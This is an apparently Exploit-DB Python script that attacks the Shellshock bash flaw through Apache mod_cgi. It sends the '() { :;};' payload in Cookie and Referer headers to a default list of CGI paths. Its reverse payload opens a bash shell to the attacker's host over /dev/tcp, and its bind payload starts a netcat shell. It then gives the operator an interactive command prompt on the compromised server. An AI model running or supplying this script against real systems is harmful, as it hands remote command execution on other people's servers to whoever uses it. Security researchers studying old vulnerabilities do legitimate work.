#!/usr/bin/env python
from socket import *
from threading import Thread
import time, urllib, sys

if sys.version_info >= (3, 0):
    import _thread as thread
    import http.client as httplib
else:
    import thread
    import httplib

stop = False
proxyhost = ""
proxyport = 0

def usage():
    print("""

	Shellshock apache mod_cgi remote exploit

Usage:
./34900.py var=<value>

Vars:
rhost: victim host
rport: victim port for TCP shell binding
lhost: attacker host for TCP shell reversing
lport: attacker port for TCP shell reversing
pages:  specific cgi vulnerable pages (separated by comma)
proxy: host:port proxy

Payloads:
"reverse" (unix unversal) TCP reverse shell (Requires: rhost, lhost, lport)
"bind" (uses non-bsd netcat) TCP bind shell (Requires: rhost, rport)

Example:

./34900.py payload=reverse rhost=1.2.3.4 lhost=5.6.7.8 lport=1234
./34900.py payload=bind rhost=1.2.3.4 rport=1234

Credits:

made by Federico Galatolo 2014
updated by Luca Cuzzolin aka czz78 2021
""")
    sys.exit(0)

def exploit(lhost, lport, rhost, rport, payload, pages):
    headers = {"Cookie": payload, "Referer": payload}

    for page in pages:
        if stop:
            return
        print("[-] Trying exploit on : " + page)
        if proxyhost != "":
            c = httplib.HTTPConnection(proxyhost, proxyport)
            c.request("GET","http://" + rhost + page, headers=headers)
            res = c.getresponse()
        else:
            c = httplib.HTTPConnection(rhost)
            c.request("GET", page, headers=headers)
            res = c.getresponse()
        if res.status == 404:
            print("[*] 404 on : " + page)
        time.sleep(1)


args = {}

for arg in sys.argv[1:]:
    ar = arg.split("=")
    args[ar[0]] = ar[1]
try:
    args['payload']
except:
    usage()

if args['payload'] == 'reverse':
    try:
        lhost = args['lhost']
        lport = int(args['lport'])
        rhost = args['rhost']
        payload = "() { :;}; /bin/bash -c /bin/bash -i >& /dev/tcp/" + lhost + "/" + str(lport) + " 0>&1 &"
    except:
        usage()
elif args['payload'] == 'bind':
    try:
        rhost = args['rhost']
        rport = args['rport']
        payload = "() { :;}; /bin/bash -c 'nc -l -p "+rport+" -e /bin/bash &'"
    except:
        usage()
else:
    print("[*] Unsupported payload")
    usage()

try:
    pages = args['pages'].split(",")
except:
    pages = ["/cgi-sys/entropysearch.cgi", "/cgi-sys/defaultwebpage.cgi", "/cgi-mod/index.cgi", "/cgi-bin/test.cgi", "/cgi-bin-sdb/printenv"]

try:
    proxyhost, proxyport = args['proxy'].split(":")
except:
    pass

if args['payload'] == 'reverse':
    serversocket = socket(AF_INET, SOCK_STREAM)
    buff = 1024
    addr = (lhost, lport)
    serversocket.bind(addr)
    serversocket.listen(10)
    print("[!] Started reverse shell handler")
    thread.start_new_thread(exploit, (lhost, lport, rhost, 0, payload, pages,))
if args['payload'] == 'bind':
    serversocket = socket(AF_INET, SOCK_STREAM)
    addr = (rhost, int(rport))
    thread.start_new_thread(exploit, ("", 0, rhost, rport, payload, pages,))

buff = 1024

while True:
    if args['payload'] == 'reverse':
        clientsocket, clientaddr = serversocket.accept()
        print("[!] Successfully exploited")
        print("[!] Incoming connection from " + clientaddr[0])
        stop = True
        clientsocket.settimeout(3)
        while True:
            if sys.version_info >= (3, 0):
                reply = input(clientaddr[0] + "> ") + "\n"
                reply = bytes(reply, 'utf-8')
            else:
                reply = raw_input(clientaddr[0] + "> ") + "\n"

            clientsocket.sendall(reply)
            try:
                data = clientsocket.recv(buff)
                print(data.decode('utf-8'))
            except:
                pass

    if args['payload'] == 'bind':
        try:
            serversocket = socket(AF_INET, SOCK_STREAM)
            time.sleep(1)
            serversocket.connect(addr)
            print("[!] Successfully exploited")
            print("[!] Connected to " + rhost)
            stop = True
            serversocket.settimeout(3)
            while True:
                if sys.version_info >= (3, 0):
                    reply = input(rhost + "> ") + "\n"
                    reply = bytes(reply, 'utf-8')
                else:
                    reply = raw_input(rhost + "> ") + "\n"
                serversocket.sendall(reply)
                data = serversocket.recv(buff)
                print(data.decode('utf-8'))
        except:
            pass
